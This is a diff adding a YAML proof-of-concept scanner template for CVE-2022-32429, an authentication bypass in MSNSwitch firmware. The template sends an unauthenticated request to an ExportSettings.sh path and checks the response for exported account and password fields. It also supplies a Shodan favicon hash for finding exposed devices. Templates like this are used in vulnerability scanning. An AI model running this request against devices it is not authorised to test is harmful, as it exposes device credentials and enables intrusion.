@@ -1,0 +1,23 @@
+id: poc-yaml-msnswitch-firmware-authentication-bypass
+info:
+  name: MSNSwitch Firmware 身份认证绕过漏洞(CVE-2022-32429)
+  severity: critical
+  tags:
+  - 未授权访问
+  - CVE-2022-32429
+  finger: msnswitch
+  shodan: http.favicon.hash:-1721140132
+requests:
+- method: GET
+  path: /cgi-bin-hax/ExportSettings.sh
+  expression: 'status_code == 200
+
+    && contains(body,"Account")
+
+    && contains(body,"Password")
+
+    && contains(headers,"Settings")
+
+    '
+variables: {}
+transport: http
